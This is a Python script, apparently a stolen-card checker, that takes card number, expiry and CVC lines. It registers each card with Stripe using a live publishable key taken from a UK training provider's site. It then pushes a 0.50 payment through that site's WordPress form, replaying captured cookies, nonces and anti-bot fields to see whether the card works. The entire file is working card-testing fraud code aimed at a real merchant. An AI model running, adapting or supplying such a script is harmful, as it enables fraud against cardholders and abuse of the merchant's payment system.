import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fac314f8efa%3B+stripe-js-v3%2Fac314f8efa%3B+card-element&referrer=https%3A%2F%2Flcfp.org.uk&time_on_page=47440&key=pk_live_51P05UI025m4Jgyco4Z31uNDfzsKpF2B5Okh5UrmyjJT2WQIvcrmVtKzVYxIx0EeY0g0toCMp34rUvjbYZdOhHdgw00unAXSyH0'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '_ga': 'GA1.1.767763590.1737050974',
	    'cookieyes-consent': 'consentid:YjFvMGJoNGZyb29aOVV0WHFPWjY0THhiVHI5ZnI1dXA,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes',
	    '__stripe_mid': 'a8296b39-ddbf-42de-9024-dcbf92222b68307cbe',
	    'burst_uid': '80246d4bdf2dd97542c167c8d0c0d554',
	    '__stripe_sid': '76564c69-fc85-4229-a91c-eb7c37a538e0ed7172',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2025-01-22%2011%3A29%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Flcfp.org.uk%2Fpay-now%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
	    'sbjs_first_add': 'fd%3D2025-01-22%2011%3A29%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Flcfp.org.uk%2Fpay-now%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
	    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
	    'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Flcfp.org.uk%2Fpay-now%2F',
	    '_ga_YPC0KVCX1L': 'GS1.1.1737544581.3.1.1737545414.0.0.0',
	    '_gcl_au': '1.1.393030293.1737050981.1838556835.1737544585.1737545414',
	}
	
	headers = {
	    'authority': 'lcfp.org.uk',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_ga=GA1.1.767763590.1737050974; cookieyes-consent=consentid:YjFvMGJoNGZyb29aOVV0WHFPWjY0THhiVHI5ZnI1dXA,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes; __stripe_mid=a8296b39-ddbf-42de-9024-dcbf92222b68307cbe; burst_uid=80246d4bdf2dd97542c167c8d0c0d554; __stripe_sid=76564c69-fc85-4229-a91c-eb7c37a538e0ed7172; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-01-22%2011%3A29%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Flcfp.org.uk%2Fpay-now%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2025-01-22%2011%3A29%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Flcfp.org.uk%2Fpay-now%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Flcfp.org.uk%2Fpay-now%2F; _ga_YPC0KVCX1L=GS1.1.1737544581.3.1.1737545414.0.0.0; _gcl_au=1.1.393030293.1737050981.1838556835.1737544585.1737545414',
	    'origin': 'https://lcfp.org.uk',
	    'referer': 'https://lcfp.org.uk/pay-now/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1737545415619',
	}
	
	data = 'data=ak_hp_textarea%3D%26ak_js%3D1737545366310%26__fluent_form_embded_post_id%3D6355%26_fluentform_7_fluentformnonce%3D6055389c49%26_wp_http_referer%3D%252Fpay-now%252F%26dropdown_2%3DLevel%25203%2509Diploma%2520in%2520Business%2520Management%2520603%252F7795%252F1%26input_radio%3DOnline%26input_radio_1%3DPay%2520in%2520Full%2520(One%2520Time%2520Fee)%26names%255Bfirst_name%255D%3D%26names%255Blast_name%255D%3D%26email%3D%26phone%3D%26address_1%255Baddress_line_1%255D%3D%26address_1%255Baddress_line_2%255D%3D%26address_1%255Bcity%255D%3D%26address_1%255Bstate%255D%3D%26address_1%255Bzip%255D%3D%26address_1%255Bcountry%255D%3D%26dropdown_1%3DHigh%2520School%2520Diploma%26payment_input%3D0.50%26payment_method%3Dstripe%26payment_method_1%3Dstripe%26ak_bib%3D%26ak_bfs%3D1737545414551%26ak_bkpc%3D0%26ak_bkp%3D%26ak_bmc%3D2%253B0%252C1645%253B16%252C4264%253B26%252C1360%253B28%252C3974%253B28%252C3139%253B22%252C32662%253B%26ak_bmcc%3D7%26ak_bmk%3D%26ak_bck%3D%26ak_bmmc%3D0%26ak_btmc%3D4%26ak_bsc%3D5%26ak_bte%3D45%253B307%252C3520%253B1%252C386%253B302%252C363%253B1%252C697%253B264%252C505%253B143%252C282%253B144%252C173%253B284%252C167%253B99%252C232%253B237%252C202%253B237%252C195%253B232%252C382%253B79%252C233%253B111%252C1835%253B352%252C167%253B234%252C133%253B1%252C247%253B699%252C18850%253B74%252C13146%253B%26ak_btec%3D20%26ak_bmm%3D%26__stripe_payment_method_id%3D'+str(pm)+'&action=fluentform_submit&form_id=7'
	
	r2 = requests.post('https://lcfp.org.uk/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
	
	return (r2.json())
